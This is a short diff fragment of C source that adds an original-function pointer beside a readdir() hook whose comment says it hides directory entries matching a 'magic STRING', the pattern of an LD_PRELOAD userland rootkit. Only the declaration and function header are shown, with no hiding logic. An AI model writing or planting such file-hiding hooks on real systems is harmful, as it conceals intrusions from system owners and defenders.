@@ -3,6 +3,7 @@
 /*
  * readdir() hook, hide based on the magic STRING.
 */
+struct dirent * (*o_readdir)(DIR *);
 struct dirent * readdir(DIR *p) {
 
 	#ifdef DEBUG
